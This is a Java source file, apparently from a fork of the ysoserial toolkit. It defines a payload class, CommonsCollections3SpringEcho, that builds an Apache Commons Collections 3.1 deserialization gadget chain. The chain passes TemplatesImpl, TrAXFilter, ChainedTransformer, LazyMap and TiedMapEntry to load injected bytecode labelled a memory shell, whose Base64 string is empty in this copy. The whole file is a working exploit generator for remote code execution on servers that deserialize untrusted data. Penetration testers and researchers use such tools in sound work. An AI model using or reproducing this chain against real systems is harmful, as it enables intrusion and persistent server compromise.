package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1","org.springframework:spring-core:4.1.4.RELEASE"})
@Authors({Authors.ERR0R233})
public class CommonsCollections3SpringEcho extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        byte[] Memshell = Base64.getDecoder().decode("");
        byte[][] bytes = {Memshell};
        ClassLoader loader = Thread.currentThread().getContextClassLoader();

        TemplatesImpl templates = new TemplatesImpl();


        Reflections.setFieldValue(templates, "_bytecodes", bytes);
        Reflections.setFieldValue(templates, "_name", "aaa");
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = {
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        Transformer[] fake = {
            new ConstantTransformer(1)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        ChainedTransformer fakeTransformer = new ChainedTransformer(fake);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, fakeTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "aaa");
        lazyMap.remove("aaa");
        Reflections.setFieldValue(lazyMap, "factory", chainedTransformer);
        return hashMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections3SpringEcho.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
